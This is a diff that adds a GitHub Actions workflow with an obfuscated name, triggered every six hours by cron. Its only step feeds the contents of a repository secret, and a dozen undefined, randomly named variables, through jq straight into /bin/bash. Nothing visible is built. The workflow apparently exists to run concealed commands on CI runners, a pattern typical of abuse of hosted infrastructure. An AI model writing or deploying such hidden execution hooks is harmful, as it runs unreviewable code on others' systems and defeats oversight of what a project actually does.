@@ -1,0 +1,29 @@
+name: chengshizhongdezheliangcheyou
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '30 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chengshizhongdezheliangcheyou
+        env:
+          do697: ${{ secrets.do697 }}
+        run: |
+          echo $do697 | jq -r .t364 | /bin/bash
+          echo $t7722 | jq -r .u35 | /bin/bash
+          echo $h63 | jq -r .zc86169 | /bin/bash
+          echo $xro9184 | jq -r .knotd4070 | /bin/bash
+          echo $yanyi06955 | jq -r .boibq2 | /bin/bash
+          echo $p44 | jq -r .nzbl9 | /bin/bash
+          echo $kmjjg9795 | jq -r .jl20773 | /bin/bash
+          echo $buq23 | jq -r .zq5 | /bin/bash
+          echo $rgor002 | jq -r .n35 | /bin/bash
+          echo $qlvqo525 | jq -r .o174 | /bin/bash
+          echo $rsx615 | jq -r .r13 | /bin/bash
+          echo $wf80342 | jq -r .uaxa85 | /bin/bash
+          echo $mlv68 | jq -r .m36118 | /bin/bash
+
